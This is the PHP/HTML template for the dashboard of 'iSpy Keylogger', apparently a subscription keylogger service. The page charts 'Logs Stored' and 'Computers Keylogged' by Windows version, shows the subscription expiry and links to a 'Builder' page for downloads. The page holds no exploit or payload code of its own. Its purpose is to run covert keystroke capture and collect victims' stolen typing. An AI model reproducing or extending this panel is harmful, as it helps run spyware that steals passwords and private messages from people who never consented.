<!DOCTYPE html>
<html lang="en">
<head>        
        <!-- META SECTION -->
        <title>iSpy Keylogger :: Dashboard</title>            
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        
        <link rel="icon" href="favicon.ico" type="image/x-icon" />
        <!-- END META SECTION -->
        
        <!-- CSS INCLUDE -->        
        <link rel="stylesheet" type="text/css" id="theme" href="css/theme-serenity.css"/>   
        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>          
        <!-- EOF CSS INCLUDE -->   
        <script type="text/javascript">    
        	$(function () {
    			$('#logs').highcharts({
        			title: {
            			text: 'Amount of logs received',
            			x: -20 //center
        			},
        			xAxis: {
            			categories: ['Today', 'Yesterday', '<?php echo date('D', strtotime('-2 days')); ?>', '<?php echo date('D', strtotime('-3 days')); ?>', 'Total']
        			},
        			yAxis: {
            			plotLines: [{
                			value: 0,
                			width: 1,
                			color: '#808080'
            			}]
        			},
        			legend: {
            			layout: 'vertical',
            			align: 'right',
            			verticalAlign: 'middle',
            			borderWidth: 0
        			},
        			series: [{
            			name: 'Logs',
            			data: [<?php echo $this->security->xss_clean($logsToday); ?>, <?php echo $this->security->xss_clean($logsYesterday); ?>, <?php echo $this->security->xss_clean($logs2daysAgo); ?>, <?php echo $this->security->xss_clean($logs3daysAgo); ?>, <?php echo $this->security->xss_clean($logsTotal); ?>]
        			}]
    			});
			});

			$(function () {
    			$('#computers').highcharts({
        			title: {
            			text: 'Amount of computers keylogged',
            			x: -20 //center
        			},
        			xAxis: {
            			categories: ['Today', 'Yesterday', '<?php echo date('D', strtotime('-2 days')); ?>', '<?php echo date('D', strtotime('-3 days')); ?>', 'Total']
        			},
        			yAxis: {
            			plotLines: [{
                			value: 0,
                			width: 1,
                			color: '#808080'
            			}]
        			},
        			legend: {
            			layout: 'vertical',
            			align: 'right',
            			verticalAlign: 'middle',
            			borderWidth: 0
        			},
        			series: [{
            			name: 'XP',
            			data: [<?php echo $this->security->xss_clean($logstodayXP); ?>, <?php echo $this->security->xss_clean($logsyesterdayXP); ?>, <?php echo $this->security->xss_clean($logs2daysagoXP); ?>, <?php echo $this->security->xss_clean($logs3daysagoXP); ?>, <?php echo $this->security->xss_clean($logstotalXP); ?>]
        			}, {
            			name: 'Vista',
            			data: [<?php echo $this->security->xss_clean($logstodayVista); ?>, <?php echo $this->security->xss_clean($logsyesterdayVista); ?>, <?php echo $this->security->xss_clean($logs2daysagoVista); ?>, <?php echo $this->security->xss_clean($logs3daysagoVista); ?>, <?php echo $this->security->xss_clean($logstotalVista); ?>]
        			}, {
            			name: 'Win 7',
            			data: [<?php echo $this->security->xss_clean($logstoday7); ?>, <?php echo $this->security->xss_clean($logsyesterday7); ?>, <?php echo $this->security->xss_clean($logs2daysago7); ?>, <?php echo $this->security->xss_clean($logs3daysago7); ?>, <?php echo $this->security->xss_clean($logstotal7); ?>]
        			}, {
            			name: 'Win 8',
            			data: [<?php echo $this->security->xss_clean($logstoday8); ?>, <?php echo $this->security->xss_clean($logsyesterday8); ?>, <?php echo $this->security->xss_clean($logs2daysago8); ?>, <?php echo $this->security->xss_clean($logs3daysago8); ?>, <?php echo $this->security->xss_clean($logstotal8); ?>]
        			}, {
                        name: 'N/A',
                        data: [<?php echo $this->security->xss_clean($logstodayUnknown); ?>, <?php echo $this->security->xss_clean($logsyesterdayUnknown); ?>, <?php echo $this->security->xss_clean($logs2daysagoUnknown); ?>, <?php echo $this->security->xss_clean($logs3daysagoUnknown); ?>, <?php echo $this->security->xss_clean($logstotalUnknown); ?>]
                    }]
    			});
			});         
		</script>                    
    </head>
    <body class="page-container-boxed">
        <!-- START PAGE CONTAINER -->
        <div class="page-container">
            
            <!-- START PAGE SIDEBAR -->
            <div class="page-sidebar">
                <!-- START X-NAVIGATION -->
                <ul class="x-navigation">
                    <li class="xn-logo1">
                        <a href="index">iSpy Keylogger</a>
                        <a href="#" class="x-navigation-control"></a>
                    </li>                 
                    <li class="xn-profile">
                        <a href="#" class="profile-mini">
                            <img src="img/avatar.png" alt="John Doe"/>
                        </a>
                        <div class="profile">
                            <div class="profile-image">
                                <img src="img/avatar.png" alt="ava"/>
                            </div>
                            <div class="profile-data">
                                <div class="profile-data-name"><?php echo $this->security->xss_clean($username); ?></div>
                                <div class="profile-data-title"><?php if ($this->security->xss_clean($group) == 0) { echo 'Administrator'; } else if ($this->security->xss_clean($group) == 1) { echo 'Standard User'; }; ?></div>
                            </div>
                        </div>                                                                        
                    </li>                                  
                    <li class="xn-title">Navigation</li>
                    <li class="active">
                        <a href="index"><span class="fa fa-home"></span> <span class="xn-text">Dashboard</span></a>
                    </li> 
                    <li>
                        <a href="logs"><span class="fa fa-keyboard-o"></span> <span class="xn-text">My Logs</span></a>
                    </li> 
                    <li class="xn-openable">
                        <a href="#"><span class="fa fa-cloud-download"></span> <span class="xn-text">Downloads</span></a>
                        <ul>
                            <li><a href="builder"><span class="xn-text">Builder</span></a></li>
                        </ul>
                    </li> 
                    <li>
                        <a href="account"><span class="fa fa-cogs"></span> <span class="xn-text">Account Settings</span></a>
                    </li>
                    <li>
                        <a href="terms"><span class="fa fa-book"></span> <span class="xn-text">Terms Of Service</span></a>
                    </li>
                    <?php if ($this->security->xss_clean($group) == 0) { ?>
                        <li>
                            <a href="admin/overview"><span class="fa fa-users"></span> <span class="xn-text">Admin</span></a>
                        </li>
                    <?php } ?>
                </ul>
                <!-- END X-NAVIGATION -->
            </div>
            <!-- END PAGE SIDEBAR -->
            
            <!-- PAGE CONTENT -->
            <div class="page-content">
                
                <!-- START X-NAVIGATION VERTICAL -->
                <ul class="x-navigation x-navigation-horizontal x-navigation-panel">
                    <!-- TOGGLE NAVIGATION -->
                    <li class="xn-icon-button">
                        <a href="#" class="x-navigation-minimize"><span class="fa fa-dedent"></span></a>
                    </li>
                    <!-- END TOGGLE NAVIGATION -->
                    <!-- SIGN OUT -->
                    <li class="xn-icon-button pull-right last">
                        <a href="#" class="mb-control" data-box="#mb-signout"><span class="fa fa-sign-out"></span></a>                        
                    </li> 
                    <!-- END SIGN OUT -->      
                </ul>
                <!-- END X-NAVIGATION VERTICAL -->                     
                
                <!-- START BREADCRUMB -->
                <ul class="breadcrumb">
                    <li><a href="#">iSpy Keylogger</a></li>
                    <li class="active">Dashboard</li>
                </ul>
                <!-- END BREADCRUMB -->                
                
                <div class="page-title">                    
                    <h2><span class="fa fa-home"></span> Dashboard</h2>
                </div>                   
                
                <!-- PAGE CONTENT WRAPPER -->
                <div class="page-content-wrap">
                
                    <div class="row">
                        <div class="col-md-12">
                            <div class="panel panel-primary">
                                <div class="panel-heading">
                                    <h3 class="panel-title">My Stats</h3>
                                </div>
                                <div class="panel-body" style="padding-bottom: 0px; padding-top: 19px;">
                                    <div class="col-md-3">                        
                            			<a href="#" class="tile tile-primary">
                                			<?php echo $this->security->xss_clean($log_amount); ?>
                                			<p>Logs Stored</p>                            
                                			<div class="informer informer-default"><span class="fa fa-keyboard-o"></span></div>
                            			</a>                        
                        			</div>
                        			<div class="col-md-3">                        
                            			<a href="#" class="tile tile-primary">
                                			<?php echo $this->security->xss_clean($computer_amount); ?>
                                			<p>Computers Keylogged</p>                            
                                			<div class="informer informer-default"><span class="fa fa-download"></span></div>
                            			</a>                        
                        			</div>
                        			<div class="col-md-3">                        
                            			<a href="#" class="tile tile-primary">
                                			<?php echo $this->security->xss_clean($expire); ?>
                                			<p>Subscription Expiration</p>                            
                                			<div class="informer informer-default"><span class="fa fa-calendar"></span></div>
                            			</a>                        
                        			</div>
                        			<div class="col-md-3">                        
                            			<a href="#" class="tile tile-primary">
                                			<?php if ($this->security->xss_clean($group) == 0) { echo 'Admin'; } else if ($this->security->xss_clean($group) == 1) { echo 'Standard'; }; ?>
                                			<p>User Group</p>                            
                                			<div class="informer informer-default"><span class="fa fa-group"></span></div>
                            			</a>                        
                        			</div>
                                </div>                          
                            </div>
                        </div>
                    </div>  
                    <div class="row">
                    	<div class="col-md-6">
                    		<div class="panel panel-primary">
                                <div class="panel-heading">
                                    <h3 class="panel-title">Logs Chart</h3>
                                </div>
                                <div class="panel-body" style="padding-bottom: 10px; padding-top: 19px;">
									<div id="logs" style="min-width: 310px; height: 300; margin: 0 auto"></div>
                                </div>
                            </div>
                    	</div>
                    	<div class="col-md-6">
                    		<div class="panel panel-primary">
                                <div class="panel-heading">
                                    <h3 class="panel-title">Keylogged Computer Chart</h3>
                                </div>
                                <div class="panel-body" style="padding-bottom: 10px; padding-top: 19px;">
                                	<div id="computers" style="min-width: 310px; height: 300; margin: 0 auto"></div>
                                </div>
                            </div>
                    	</div>
                    </div>            
                    
                </div>
                <!-- END PAGE CONTENT WRAPPER -->                
            </div>            
            <!-- END PAGE CONTENT -->
        </div>
        <!-- END PAGE CONTAINER -->

        <!-- MESSAGE BOX-->
        <div class="message-box animated fadeIn" data-sound="alert" id="mb-signout">
            <div class="mb-container">
                <div class="mb-middle">
                    <div class="mb-title"><span class="fa fa-sign-out"></span> Log <strong>Out</strong> ?</div>
                    <div class="mb-content">
                        <p>Are you sure you want to log out?</p>                    
                        <p>If you would like to continue using iSpy Keylogger, please click no.</p>
                    </div>
                    <div class="mb-footer">
                        <div class="pull-right">
                            <a href="logout" class="btn btn-success btn-lg">Yes</a>
                            <button class="btn btn-default btn-lg mb-control-close">No</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- END MESSAGE BOX-->

        <!-- START PRELOADS -->
        <audio id="audio-alert" src="audio/alert.mp3" preload="auto"></audio>
        <audio id="audio-fail" src="audio/fail.mp3" preload="auto"></audio>
        <!-- END PRELOADS -->                 
        
    <!-- START SCRIPTS -->
        <!-- START PLUGINS -->
        <script type="text/javascript" src="js/plugins/jquery/jquery.min.js"></script>
        <script type="text/javascript" src="js/plugins/jquery/jquery-ui.min.js"></script>
        <script type="text/javascript" src="js/plugins/bootstrap/bootstrap.min.js"></script>        
        <!-- END PLUGINS -->

        <!-- THIS PAGE PLUGINS -->
        <script type="text/javascript" src="js/plugins/mcustomscrollbar/jquery.mCustomScrollbar.min.js"></script>
        <!-- END PAGE PLUGINS -->         

        <!-- START TEMPLATE -->
        <script type="text/javascript" src="js/plugins.js"></script>        
        <script type="text/javascript" src="js/actions.js"></script>  
        <script type="text/javascript" src="js/highcharts.js"></script>
        <!-- END TEMPLATE -->
    <!-- END SCRIPTS -->         
    </body>
</html>